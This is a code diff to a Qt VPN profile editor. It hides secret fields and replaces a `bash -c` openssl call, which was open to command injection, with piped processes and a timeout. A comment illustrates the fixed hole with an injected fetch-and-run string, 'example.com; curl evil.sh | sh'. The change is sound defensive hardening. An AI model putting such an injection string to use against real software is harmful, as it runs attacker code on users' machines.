@@ -14,7 +14,11 @@
 #include <QProcess>
 #include <QPushButton>
 #include <QSpinBox>
+#include <QStandardPaths>
 #include <QStackedWidget>
+#include <QTimer>
+
+#include <memory>
 #include <QTabWidget>
 #include <QToolButton>
 #include <QUrl>
@@ -179,6 +183,7 @@ void ProfileEditor::buildUi() {
             m_portalPort->setRange(1, 65535);
             m_portalPort->setValue(2000);
             m_portalSecret = new QLineEdit(pg);
+            m_portalSecret->setEchoMode(QLineEdit::Password);
             m_portalSecret->setPlaceholderText(tr("shared secret (often 'h3c' or 'huawei3com')"));
             m_portalDialect = new QComboBox(pg);
             m_portalDialect->addItem(tr("Portal v2 (standard GB/T)"),  0);
@@ -235,6 +240,7 @@ void ProfileEditor::buildUi() {
 
             // Zero-Trust / SDP single-packet-authorization knock.
             m_spaKey = new QLineEdit(pg);
+            m_spaKey->setEchoMode(QLineEdit::Password);
             m_spaKey->setPlaceholderText(tr("hex HOTP key from SDP enrollment — leave blank for plain SSL VPN"));
             m_spaAid = new QLineEdit(pg);
             m_spaAid->setPlaceholderText(tr("hex client AID (optional)"));
@@ -371,28 +377,75 @@ void ProfileEditor::fetchPin() {
     }
 
     // openssl s_client -connect host:port </dev/null | openssl x509 -fingerprint -sha256 -noout
-    QProcess proc;
-    proc.start(QStringLiteral("bash"), {QStringLiteral("-c"),
-        QStringLiteral("openssl s_client -connect %1:%2 </dev/null 2>/dev/null "
-                       "| openssl x509 -fingerprint -sha256 -noout")
-            .arg(host).arg(port)});
-    if (!proc.waitForFinished(12000)) {
-        proc.kill();
+    // Two piped QProcess'es — never through `bash -c`, which would let pasted
+    // text like "example.com; curl evil.sh | sh" execute. Async: a 12 s
+    // synchronous wait used to freeze the whole dialog.
+    const QString openssl = QStandardPaths::findExecutable(QStringLiteral("openssl"));
+    if (openssl.isEmpty()) {
         QMessageBox::warning(this, tr("Fetch pin"),
-                             tr("Timed out contacting %1:%2.").arg(host).arg(port));
+                             tr("openssl is not installed."));
         return;
     }
-    const QString out = QString::fromUtf8(proc.readAllStandardOutput());
-    const int eq = out.indexOf(QLatin1Char('='));
-    const QString pin = (eq >= 0) ? out.mid(eq + 1).trimmed() : QString();
-    if (pin.isEmpty()) {
+    auto* sClient = new QProcess(this);
+    auto* x509 = new QProcess(this);
+    // s_client's stdout becomes x509's stdin (setStandardOutputProcess(callee)
+    // wires caller-stdout -> callee-stdin).
+    sClient->setStandardOutputProcess(x509);
+    sClient->setProgram(openssl);
+    sClient->setArguments({QStringLiteral("s_client"),
+                           QStringLiteral("-connect"),
+                           QStringLiteral("%1:%2").arg(host).arg(port)});
+    x509->setProgram(openssl);
+    x509->setArguments({QStringLiteral("x509"),
+                        QStringLiteral("-fingerprint"), QStringLiteral("-sha256"),
+                        QStringLiteral("-noout")});
+
+    auto cleanup = [sClient, x509] {
+        sClient->deleteLater();
+        x509->deleteLater();
+    };
+    // Shared done-flag: whichever side finishes first (fetch or timeout)
+    // reports exactly one outcome.
+    auto done = std::make_shared<bool>(false);
+
+    // Whatever x509 prints (even on a partial read) is the answer we parse.
+    connect(x509, &QProcess::finished, this,
+            [this, cleanup, done](int exitCode, QProcess::ExitStatus st) {
+        if (*done) return;              // timeout already handled it
+        *done = true;
+        const QString out = QString::fromUtf8(
+            qobject_cast<QProcess*>(sender())->readAllStandardOutput());
+        const int eq = out.indexOf(QLatin1Char('='));
+        const QString pin = (eq >= 0) ? out.mid(eq + 1).trimmed() : QString();
+        if (st == QProcess::NormalExit && exitCode == 0 && !pin.isEmpty())
+            m_sslvpnPin->setText(pin);
+        else
+            QMessageBox::warning(this, tr("Fetch pin"),
+                                 tr("Could not read a certificate from the gateway. "
+                                    "Is the gateway reachable and is openssl installed?"));
+        cleanup();
+    });
+
+    // Hard bound: an unreachable gateway leaves s_client in a minutes-long
+    // TCP connect; kill both processes and say so instead of hanging.
+    auto* timeout = new QTimer(this);
+    timeout->setSingleShot(true);
+    connect(timeout, &QTimer::timeout, this, [this, sClient, x509, timeout, done] {
+        if (*done) { timeout->deleteLater(); return; }
+        *done = true;
+        if (sClient->state() != QProcess::NotRunning) sClient->kill();
+        if (x509->state() != QProcess::NotRunning) x509->kill();
+        timeout->deleteLater();
         QMessageBox::warning(this, tr("Fetch pin"),
-                             tr("Could not read a certificate from %1:%2. "
-                                "Is the gateway reachable and is openssl installed?")
-                                 .arg(host).arg(port));
-        return;
-    }
-    m_sslvpnPin->setText(pin);
+                             tr("Timed out contacting the gateway."));
+    });
+    timeout->start(15000);
+
+    sClient->start();
+    x509->start();
+    // openssl s_client would otherwise wait on stdin forever.
+    sClient->closeWriteChannel();
+    x509->closeWriteChannel();
 }
 
 void ProfileEditor::onKindChanged(int index) {
